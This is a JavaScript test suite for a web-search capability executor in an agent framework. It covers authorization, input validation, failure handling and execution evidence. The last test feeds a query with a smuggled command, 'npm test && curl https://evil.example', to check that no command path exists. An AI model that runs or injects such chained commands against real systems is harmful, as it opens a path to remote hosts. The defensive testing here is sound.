import { describe, it } from "node:test";
import { strictEqual, deepStrictEqual } from "node:assert";
import { WebSearchCapabilityExecutor } from "../dist/index.js";

const descriptor = { capabilityId: "web.search", description: "Search the web", inputSchema: { type: "object" }, outputSchema: { type: "object" } };

let requestNumber = 0;
function request(input, agentId = "research") {
  requestNumber += 1;
  return { requestId: `search-${requestNumber}`, capabilityId: "web.search", agentId, workflowId: "workflow-search", correlationId: "correlation-search", input, requestedAt: "2026-08-11T00:00:00.000Z" };
}

function setup(provider, authorized = true) {
  const calls = [];
  const resolver = {
    resolve: (capabilityId) => capabilityId === "web.search" ? descriptor : null,
    isAuthorized: (agentId, capabilityId) => authorized && agentId === "research" && capabilityId === "web.search",
  };
  const wrappedProvider = {
    search: async (value) => { calls.push(value); return provider(value); },
  };
  return { calls, executor: new WebSearchCapabilityExecutor(wrappedProvider, resolver, { maxResults: 5, maxQueryLength: 100 }) };
}

const results = [
  { title: "AI Media Factory", url: "https://example.com/factory", snippet: "A structured result", source: "fake-provider", rank: 1 },
  { title: "Capability Design", url: "https://example.org/capability", snippet: "Another result", source: "fake-provider", rank: 2 },
];

describe("WebSearchCapabilityExecutor", () => {
  it("executes a valid search through the injected provider", async () => {
    const { executor, calls } = setup(async (value) => ({ providerId: "fake-search", results }));
    const result = await executor.execute(request({ query: "capability architecture", maxResults: 2, allowedDomains: ["example.com"] }));
    strictEqual(result.status, "success");
    strictEqual(calls[0].query, "capability architecture");
    strictEqual(calls[0].maxResults, 2);
    deepStrictEqual(result.output.results, results);
    strictEqual(result.output.providerId, "fake-search");
  });

  it("produces truthful execution evidence and preserves context", async () => {
    const { executor } = setup(async () => ({ providerId: "fake-search", results }));
    const result = await executor.execute(request({ query: "evidence" }));
    strictEqual(result.status, "success");
    strictEqual(result.evidence.capabilityId, "web.search");
    strictEqual(result.evidence.providerId, "fake-search");
    strictEqual(result.evidence.providerInvoked, true);
    strictEqual(result.evidence.resultCount, 2);
    strictEqual(result.evidence.workflowId, "workflow-search");
    strictEqual(result.evidence.correlationId, "correlation-search");
    strictEqual(result.evidence.agentId, "research");
  });

  it("blocks unauthorized execution without invoking the provider", async () => {
    let invoked = false;
    const { executor } = setup(async () => { invoked = true; return { providerId: "fake", results }; }, false);
    const result = await executor.execute(request({ query: "blocked" }));
    strictEqual(result.status, "blocked");
    strictEqual(invoked, false);
    strictEqual(result.evidence, undefined);
  });

  it("blocks empty, oversized, and invalid-domain queries", async () => {
    const { executor } = setup(async () => ({ providerId: "fake", results }));
    strictEqual((await executor.execute(request({ query: "   " }))).status, "blocked");
    strictEqual((await executor.execute(request({ query: "valid", maxResults: 6 }))).status, "blocked");
    strictEqual((await executor.execute(request({ query: "valid", allowedDomains: ["not a domain"] }))).status, "blocked");
  });

  it("represents provider failures as FAILED with failure evidence", async () => {
    const { executor } = setup(async () => { throw new Error("provider unavailable"); });
    const result = await executor.execute(request({ query: "failure" }));
    strictEqual(result.status, "failed");
    strictEqual(result.error.code, "PROVIDER_ERROR");
    strictEqual(result.evidence.providerInvoked, true);
    strictEqual(result.evidence.succeeded, false);
  });

  it("rejects malformed provider results without fabricating success", async () => {
    const { executor } = setup(async () => ({ providerId: "fake", results: [{ title: "missing url", snippet: "bad", source: "fake", rank: 1 }] }));
    const result = await executor.execute(request({ query: "malformed" }));
    strictEqual(result.status, "failed");
    strictEqual(result.error.code, "INVALID_PROVIDER_RESPONSE");
  });

  it("does not expose an HTTP or command execution path", async () => {
    const { executor, calls } = setup(async (value) => ({ providerId: "fake", results }));
    const result = await executor.execute(request({ query: "npm test && curl https://evil.example" }));
    strictEqual(result.status, "success");
    strictEqual(calls.length, 1);
    strictEqual(calls[0].query.includes("npm test"), true);
  });
});
